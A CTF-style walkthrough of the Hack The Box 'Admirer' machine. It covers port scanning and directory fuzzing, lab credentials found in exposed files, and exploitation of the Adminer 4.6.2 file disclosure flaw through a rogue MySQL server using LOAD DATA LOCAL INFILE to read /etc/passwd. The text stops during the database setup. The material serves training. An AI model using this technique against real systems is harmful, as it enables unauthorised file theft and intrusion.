@@ -1,0 +1,1084 @@
+I"��<blockquote>
+  <p>Admirer is an easy box with bunch of rabbit holes where usual enumeration workflow doesn’t work forcing us think out of the box and gather initial data. We’ll start with web-recon where will find FTP credentials, inside FTP share we’ll discover an outdated source code of the website leading us enumerate further and discover an vulnerable version of Adminer Web Interface running on Box allowing us to read local files on the server, where we’ll read current source of the page, get credentials which works for SSH access. For elevating privilege to root we’ll abuse sudo privilege allowing us to set up an environment variable and execute a script, leading to Python Library hijack and get RCE as root.</p>
+</blockquote>
+
+<h2 id="reconnaissance">Reconnaissance</h2>
+
+<p>Let’s begin with <code class="language-plaintext highlighter-rouge">masscan</code> to discover open ports:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb
+→ masscan <span class="nt">-e</span> tun0 <span class="nt">-p0-65535</span> <span class="nt">--max-rate</span> 500 10.10.10.187 | <span class="nb">tee </span>masscan-alltcp
+
+Starting masscan 1.0.5 <span class="o">(</span>http://bit.ly/14GZzcT<span class="o">)</span> at 2020-09-28 10:24:21 GMT
+ <span class="nt">--</span> forced options: <span class="nt">-sS</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">--randomize-hosts</span> <span class="nt">-v</span> <span class="nt">--send-eth</span>
+Initiating SYN Stealth Scan
+Scanning 1 hosts <span class="o">[</span>65536 ports/host]
+Discovered open port 21/tcp on 10.10.10.187
+Discovered open port 22/tcp on 10.10.10.187
+Discovered open port 80/tcp on 10.10.10.187
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>I’ll use <code class="language-plaintext highlighter-rouge">tee</code> to save the output in a file, <code class="language-plaintext highlighter-rouge">masscan</code> output shows ports <code class="language-plaintext highlighter-rouge">21,22 &amp; 80</code> are open. Let’s enumerate these ports using <code class="language-plaintext highlighter-rouge">nmap</code> to find out their services.
+Before running nmap scan we’ll make use of some bash commands:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ <span class="nb">cat </span>masscan-alltcp | <span class="nb">grep </span>tcp | <span class="nb">sed</span> <span class="s1">'s/Discovered open port //'</span> | <span class="nb">awk</span> <span class="nt">-F</span>/ <span class="s1">'{print $1}'</span> <span class="nv">ORS</span><span class="o">=</span><span class="s1">','</span>
+21,22,80,
+
+cfx:  ~/Documents/htb/admirer
+→ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,22,80 10.10.10.187 <span class="nt">-oN</span> nmap-enum
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2020-09-28 18:03 IST
+Nmap scan report <span class="k">for </span>10.10.10.187
+Host is up <span class="o">(</span>0.29s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey:
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
+| http-robots.txt: 1 disallowed entry
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>20.67 seconds
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Services running on Port 21,22 and 80 are FTP, SSH and HTTP respectively. On port 21 an FTP service is running but nmap didn’t output if anonymous login is allowed so for now we will move ahead with other ports enumeration.</p>
+
+<h3 id="port-80---http">Port 80 - HTTP</h3>
+
+<p>Nmap output detects <code class="language-plaintext highlighter-rouge">robots.txt</code> on the site with an disallowed entry for <code class="language-plaintext highlighter-rouge">/admin-dir</code>, On visiting <a href="http://10.10.10.187">http://10.10.10.187</a> a website with multiple images is shown:</p>
+
+<p><img src="/assets/img/Posts/Admirer/website.png" alt="website" /></p>
+
+<p>Let’s run <code class="language-plaintext highlighter-rouge">ffuf</code> against this site to discover hidden files and directories:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://10.10.10.187/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt <span class="nt">-e</span> .txt,.php <span class="nt">-fc</span> 403
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.187/FUZZ
+ :: Extensions       : .txt .php
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 403
+________________________________________________
+
+index.php               [Status: 200, Size: 6051, Words: 385, Lines: 154]
+robots.txt              [Status: 200, Size: 138, Words: 21, Lines: 5]
+:: Progress: [60348/60348] :: Job [1/1] :: 99 req/sec :: Duration: [0:10:05] :: Errors: 0 ::
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+<p>Looking at the output nothing interesting is discovered except for <code class="language-plaintext highlighter-rouge">robots.txt</code> which was mentioned in nmap output as well, Looking at the <code class="language-plaintext highlighter-rouge">robots.txt</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ curl http://10.10.10.187/robots.txt
+User-agent: <span class="k">*</span>
+
+<span class="c"># This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo</span>
+Disallow: /admin-dir
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>Clearly It hints us to check <code class="language-plaintext highlighter-rouge">/admin-dir</code>, also we’ll note <code class="language-plaintext highlighter-rouge">waldo</code> as an potential username for now.</p>
+
+<p>On checking <a href="http://10.10.10.187admin-dir">http://10.10.10.187admin-dir</a> but we a 403, so indexing is disabled but it doesn’t mean we can’t fuzz the directory for hidden files, let’s run <code class="language-plaintext highlighter-rouge">ffuf</code> on the <code class="language-plaintext highlighter-rouge">/admin-dir</code> directory to check if can find something interesting:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://10.10.10.187/admin-dir/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt <span class="nt">-e</span> .txt,.php <span class="nt">-fc</span> 403
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.187/admin-dir/FUZZ
+ :: Extensions       : .txt .php
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 403
+________________________________________________
+
+contacts.txt            [Status: 200, Size: 350, Words: 19, Lines: 30]
+credentials.txt         [Status: 200, Size: 136, Words: 5, Lines: 12]
+:: Progress: [60348/60348] :: Job [1/1] :: 182 req/sec :: Duration: [0:05:31] :: Errors: 0 ::
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>As mentioned in <code class="language-plaintext highlighter-rouge">robots.txt</code>, we do find <code class="language-plaintext highlighter-rouge">contacts.txt</code> and <code class="language-plaintext highlighter-rouge">credentails.txt</code> inside <code class="language-plaintext highlighter-rouge">\admin-dir</code></p>
+
+<p>Looking at the <code class="language-plaintext highlighter-rouge">contacts.txt</code> file we have some email addresses and potential usernames:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ curl http://10.10.10.187/admin-dir/contacts.txt
+
+<span class="c">##########</span>
+<span class="c"># admins #</span>
+<span class="c">##########</span>
+<span class="c"># Penny</span>
+Email: p.wise@admirer.htb
+
+
+<span class="c">##############</span>
+<span class="c"># developers #</span>
+<span class="c">##############</span>
+<span class="c"># Rajesh</span>
+Email: r.nayyar@admirer.htb
+
+<span class="c"># Amy</span>
+Email: a.bialik@admirer.htb
+
+<span class="c"># Leonard</span>
+Email: l.galecki@admirer.htb
+
+
+
+<span class="c">#############</span>
+<span class="c"># designers #</span>
+<span class="c">#############</span>
+<span class="c"># Howard</span>
+Email: h.helberg@admirer.htb
+
+<span class="c"># Bernadette</span>
+Email: b.rauch@admirer.htb
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>On <code class="language-plaintext highlighter-rouge">credentials.txt</code> we discover some creds:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre></td> --><td class="rouge-code"><pre><span class="n">cfx</span><span class="p">:</span>  <span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">admirer</span>
+<span class="err">→</span> <span class="n">curl</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">10.187</span><span class="o">/</span><span class="n">admin</span><span class="o">-</span><span class="nb">dir</span><span class="o">/</span><span class="n">credentials</span><span class="p">.</span><span class="n">txt</span>
+<span class="p">[</span><span class="n">Internal</span> <span class="n">mail</span> <span class="n">account</span><span class="p">]</span>
+<span class="n">w</span><span class="p">.</span><span class="n">cooper</span><span class="o">@</span><span class="n">admirer</span><span class="p">.</span><span class="n">htb</span>
+<span class="n">fgJr6q</span><span class="c1">#S\W:$P
+</span>
+<span class="p">[</span><span class="n">FTP</span> <span class="n">account</span><span class="p">]</span>
+<span class="n">ftpuser</span>
+<span class="o">%</span><span class="n">n</span><span class="err">?</span><span class="mi">4</span><span class="n">Wz</span><span class="p">}</span><span class="n">R</span><span class="err">$</span><span class="n">tTF7</span>
+
+<span class="p">[</span><span class="n">Wordpress</span> <span class="n">account</span><span class="p">]</span>
+<span class="n">admin</span>
+<span class="n">w0rdpr3ss01</span><span class="err">!</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="port-21---ftp-access">Port 21 - FTP Access</h3>
+
+<p>Now that we have credentials for FTP, let try to access FTP:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ ftp 10.10.10.187
+Connected to 10.10.10.187.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+Name <span class="o">(</span>10.10.10.187:root<span class="o">)</span>: ftpuser
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; bin
+200 Switching to Binary mode.
+ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 0        0            3405 Dec 02  2019 dump.sql
+<span class="nt">-rw-r--r--</span>    1 0        0         5270987 Dec 03  2019 html.tar.gz
+226 Directory send OK.
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Inside FTP we find <code class="language-plaintext highlighter-rouge">dump.sql</code> and <code class="language-plaintext highlighter-rouge">html.tar.gz</code>, lets download them to our machine and analyse further:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre></td> --><td class="rouge-code"><pre>ftp&gt; get dump.sql
+<span class="nb">local</span>: dump.sql remote: dump.sql
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>dump.sql <span class="o">(</span>3405 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+3405 bytes received <span class="k">in </span>0.00 secs <span class="o">(</span>2.9628 MB/s<span class="o">)</span>
+ftp&gt; get html.tar.gz
+<span class="nb">local</span>: html.tar.gz remote: html.tar.gz
+200 PORT <span class="nb">command </span>successful. Consider using PASV.
+150 Opening BINARY mode data connection <span class="k">for </span>html.tar.gz <span class="o">(</span>5270987 bytes<span class="o">)</span><span class="nb">.</span>
+226 Transfer complete.
+5270987 bytes received <span class="k">in </span>16.02 secs <span class="o">(</span>321.3846 kB/s<span class="o">)</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">dump.sql</code> contains tables for the images displayed on the site, nothing interesting except database name <code class="language-plaintext highlighter-rouge">admirerdb</code> and it being served on localhost</p>
+
+<h3 id="analysing-website-source">Analysing Website Source</h3>
+
+<p>Extracting the website source <code class="language-plaintext highlighter-rouge">html.tar.gz</code>:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer/ftp
+→ <span class="nb">mkdir </span>html
+
+cfx:  ~/Documents/htb/admirer/ftp
+→ <span class="nb">tar</span> <span class="nt">-xvzf</span> html.tar.gz <span class="nt">--directory</span><span class="o">=</span>html/
+
+cfx:  ~/Documents/htb/admirer/ftp/html
+→ <span class="nb">ls
+</span>assets  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1r
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>We have the following:</p>
+
+<ul>
+  <li>
+    <p><code class="language-plaintext highlighter-rouge">assets</code> and <code class="language-plaintext highlighter-rouge">images</code> directory contains css files and images of the website.</p>
+  </li>
+  <li>The contents of <code class="language-plaintext highlighter-rouge">index.php</code> seems similar to website’s source with additional connection information for the database:
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td> --><td class="rouge-code"><pre>  &lt;?php
+      <span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+      <span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
+      <span class="nv">$password</span> <span class="o">=</span> <span class="s2">"]F7jLHw:*G&gt;UPrTo}~A"</span>d6b<span class="s2">";
+      </span><span class="nv">$dbname</span><span class="s2"> = "</span>admirerdb<span class="s2">";
+
+      // Create connection
+      </span><span class="nv">$conn</span><span class="s2"> = new mysqli(</span><span class="nv">$servername</span><span class="s2">, </span><span class="nv">$username</span><span class="s2">, </span><span class="nv">$password</span><span class="s2">, </span><span class="nv">$dbname</span><span class="s2">);
+</span></pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+  <li>There is also one more directory <code class="language-plaintext highlighter-rouge">utility-scripts</code> containing some PHP files:</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer/ftp/html/utility-scripts
+→ <span class="nb">ls
+</span>admin_tasks.php  db_admin.php  info.php  phptest.php
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>On visiting each of these files on the website and reading the contents we have gathered the following facts:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">admin_tasks.php</code> located at <a href="http://10.10.10.187/utility-scripts/admin_tasks.php">http://10.10.10.187/utility-scripts/admin_tasks.php</a> is some kind of panel used to perform the following operations:</li>
+</ul>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre></td> --><td class="rouge-code"><pre>Available options:
+           1<span class="o">)</span> View system <span class="nb">uptime
+           </span>2<span class="o">)</span> View logged <span class="k">in </span><span class="nb">users
+           </span>3<span class="o">)</span> View crontab <span class="o">(</span>current user only<span class="o">)</span>
+           4<span class="o">)</span> Backup passwd file <span class="o">(</span>not working<span class="o">)</span>
+           5<span class="o">)</span> Backup shadow file <span class="o">(</span>not working<span class="o">)</span>
+           6<span class="o">)</span> Backup web data <span class="o">(</span>not working<span class="o">)</span>
+           7<span class="o">)</span> Backup database <span class="o">(</span>not working<span class="o">)</span>
+
+           NOTE: Options 4-7 are currently NOT working because they need root privileges.
+</pre></td></tr></tbody></table></code></pre></div></div>
+<p>On the website we are able to perform the first 3 tasks whereas the other 4-7 backup tasks can only performed with root privileges.</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">info.php</code> is the the PHP info page</li>
+  <li><code class="language-plaintext highlighter-rouge">phptest.php</code> is a dummy PHP page</li>
+  <li><code class="language-plaintext highlighter-rouge">db_admin.php</code> gives us db credentials for the same user <code class="language-plaintext highlighter-rouge">waldo</code> we saw inside <code class="language-plaintext highlighter-rouge">index.php</code> but the passwords are different.
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer/ftp/html/utility-scripts
+→ <span class="nb">cat </span>db_admin.php
+&lt;?php
+<span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"waldo"</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"Wh3r3_1s_w4ld0?"</span><span class="p">;</span>
+
+// Create connection
+<span class="nv">$conn</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="nv">$servername</span>, <span class="nv">$username</span>, <span class="nv">$password</span><span class="o">)</span><span class="p">;</span>
+
+// Check connection
+<span class="k">if</span> <span class="o">(</span><span class="nv">$conn</span>-&gt;connect_error<span class="o">)</span> <span class="o">{</span>
+    die<span class="o">(</span><span class="s2">"Connection failed: "</span> <span class="nb">.</span> <span class="nv">$conn</span>-&gt;connect_error<span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+<span class="nb">echo</span> <span class="s2">"Connected successfully"</span><span class="p">;</span>
+
+
+// TODO: Finish implementing this or find a better open <span class="nb">source </span>alternative
+?&gt;
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+    <p>We are able to visit other 3 files on the site except <code class="language-plaintext highlighter-rouge">db_admin.php</code> which returns 404.</p>
+  </li>
+</ul>
+
+<p>The comment inside <code class="language-plaintext highlighter-rouge">db_admin.php</code> says to <code class="language-plaintext highlighter-rouge">TODO: Finish implementing this or find a better open source alternative</code>, maybe the reason why we are getting 404 is that the dev found an open source alternative. With that thought I decided to fuzz this directory using <code class="language-plaintext highlighter-rouge">ffuf</code> hoping to find something:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ ffuf <span class="nt">-c</span> <span class="nt">-r</span> <span class="nt">-u</span> http://10.10.10.187/utility-scripts/FUZZ <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt <span class="nt">-e</span> .txt,.php <span class="nt">-fc</span> 403
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v1.0.2
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.10.10.187/utility-scripts/FUZZ
+ :: Extensions       : .txt .php
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403
+ :: Filter           : Response status: 403
+________________________________________________
+
+info.php                [Status: 200, Size: 83802, Words: 4024, Lines: 962]
+phptest.php             [Status: 200, Size: 32, Words: 8, Lines: 1]
+adminer.php             [Status: 200, Size: 4158, Words: 189, Lines: 52]
+:: Progress: [60348/60348] :: Job [1/1] :: 176 req/sec :: Duration: [0:05:42] :: Errors: 0 ::
+</span></pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>Bingo! We found an additional page <code class="language-plaintext highlighter-rouge">adminer.php</code></p>
+
+<blockquote>
+  <p>Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.</p>
+</blockquote>
+
+<h2 id="adminer-exploitation">Adminer Exploitation</h2>
+
+<p>On accessing <a href="http://10.10.10.187/utility-scripts/adminer.php">http://10.10.10.187/utility-scripts/adminer.php</a> we find the login page:</p>
+
+<p><img src="/assets/img/Posts/Admirer/website1.png" alt="website1" /></p>
+
+<p>I tried to login with the credentials discovered earlier for user waldo but none of them worked.</p>
+
+<h3 id="exploit">Exploit</h3>
+
+<p>Looking at the version <code class="language-plaintext highlighter-rouge">adminer 4.6.2</code>, a quick google search revealed version Adminer 4.6.2 is vulnerable to file disclosure [<strong>vulnerability]</strong>(https://www.acunetix.com/vulnerabilities/web/adminer-4-6-2-file-disclosure-vulnerability/)</p>
+
+<p>Below two articles can be referred to understand how the Exploitation works in detail:</p>
+
+<ul>
+  <li><a href="https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f">https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f</a></li>
+  <li><a href="https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool">https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool</a></li>
+</ul>
+
+<p>Bottom-line is we cannot to any database on Admirer but the same time we can host a database on our machine and access it remotely from Adminer.</p>
+
+<h3 id="attack-scenario">Attack Scenario</h3>
+
+<ul>
+  <li>Setup a MySQL server on Attacking machine</li>
+  <li>Access database from Adminer</li>
+  <li>Reading localfiles using and inserting the content into table using:
+    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre></td> --><td class="rouge-code"><pre>LOAD DATA LOCAL INFILE <span class="s1">'/etc/passwd'</span>
+INTO TABLE test.test
+FIELDS TERMINATED BY <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>
+</pre></td></tr></tbody></table></code></pre></div>    </div>
+  </li>
+</ul>
+
+<h3 id="mysql-setup">MySQL Setup</h3>
+
+<p>We’ll host a MariaDB instance using the following commands, I have added comments against each command to understand its usage:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre></td> --><td class="rouge-code"><pre>cfx:  ~/Documents/htb/admirer
+→ service mysql start      <span class="c">#Start MySQL service</span>
+
+cfx:  ~/Documents/htb/admirer
+→ mysql <span class="nt">-u</span> root                             <span class="c">#Login MySQL</span>
+Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MariaDB connection <span class="nb">id </span>is 51
+Server version: 10.3.24-MariaDB-2 Debian build-unstable
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> CREATE DATABASE reverseshell<span class="p">;</span>       <span class="c">#Creating a new database</span>
+Query OK, 1 row affected <span class="o">(</span>0.000 sec<span class="o">)</span>
+
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> CREATE USER <span class="s1">'cfx'</span>@<span class="s1">'%'</span> IDENTIFIED BY <span class="s1">'coldfusionx'</span><span class="p">;</span> <span class="c">#Creating user cfx:coldfusionx {username:password}</span>
+Query OK, 0 rows affected <span class="o">(</span>0.046 sec<span class="o">)</span>
+
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> GRANT ALL PRIVILEGES ON <span class="k">*</span>.<span class="k">*</span> TO <span class="s1">'cfx'</span>@<span class="s1">'%'</span><span class="p">;</span> <span class="c">#Granting user cfx privileges to access everything</span>
+Query OK, 0 rows affected <span class="o">(</span>0.000 sec<span class="o">)</span>
+
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> FLUSH PRIVILEGES<span class="p">;</span>   <span class="c">#Refresh Privileges of User</span>
+Query OK, 0 rows affected <span class="o">(</span>0.000 sec<span class="o">)</span>
+
+MariaDB <span class="o">[(</span>none<span class="o">)]&gt;</span> USE reverseshell<span class="p">;</span> <span class="c">#Changing database to reverseshell</span>
+Database changed
+MariaDB <span class="o">[</span>reverseshell]&gt; CREATE TABLE shell <span class="o">(</span>data VARCHAR<span class="o">(</span>255<span class="o">))</span><span class="p">;</span>  <span class="c">#Creating a table named shell</span>
+Query OK, 0 rows affected <span class="o">(</span>0.081 sec<span class="o">)</span>
+
+MariaDB <span class="o">[</span>reverseshell]&gt; <span class="nb">exit
+</span>Bye
+</pre></td></tr></tbody></table></code></pre></div></div>
